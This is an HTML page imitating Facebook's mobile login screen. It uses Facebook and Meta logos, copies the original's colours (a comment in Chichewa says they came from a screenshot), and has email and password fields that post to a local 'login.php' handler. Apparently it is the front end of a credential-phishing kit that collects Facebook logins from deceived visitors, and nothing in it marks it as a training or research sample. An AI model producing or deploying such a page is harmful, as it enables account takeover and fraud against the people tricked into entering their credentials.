<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            background-color: #1c2b33; /* Mtundu wa mu screenshot mwanu */
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .lang-selector {
            font-size: 14px;
            color: #bcc0c4;
            margin-bottom: 40px;
        }

        .fb-logo {
            width: 80px;
            height: 80px;
            margin-bottom: 40px;
        }

        form {
            width: 90%;
            max-width: 380px;
        }

        input {
            width: 100%;
            background-color: #1c2b33;
            border: 1px solid #3e4f59;
            border-radius: 12px;
            padding: 18px;
            margin-bottom: 15px;
            color: white;
            font-size: 16px;
            box-sizing: border-box;
        }

        input::placeholder {
            color: #8a96a3;
        }

        .login-btn {
            width: 100%;
            background-color: #0064e0;
            color: white;
            border: none;
            border-radius: 25px; /* Rounded button */
            padding: 14px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .forgot-password {
            color: white;
            text-decoration: none;
            font-size: 16px;
            margin-top: 25px;
            display: block;
            text-align: center;
        }

        .create-account {
            width: 90%;
            max-width: 380px;
            background-color: transparent;
            color: #0064e0;
            border: 1px solid #0064e0;
            border-radius: 25px;
            padding: 12px;
            font-size: 16px;
            font-weight: 500;
            text-decoration: none;
            text-align: center;
            position: absolute;
            bottom: 60px;
        }

        .meta-logo {
            position: absolute;
            bottom: 25px;
            width: 60px;
            opacity: 0.8;
        }
    </style>
</head>
<body>

    <div class="lang-selector">English (US) ⌵</div>

    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo" alt="FB">

    <form action="login.php" method="post">
        <input type="text" name="email" placeholder="Mobile number or email" required>
        <input type="password" name="pass" placeholder="Password" required>
        <button type="submit" class="login-btn">Log in</button>
    </form>

    <a href="#" class="forgot-password">Forgot password?</a>

    <a href="#" class="create-account">Create new account</a>

    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" class="meta-logo" alt="Meta">

</body>
    </html>
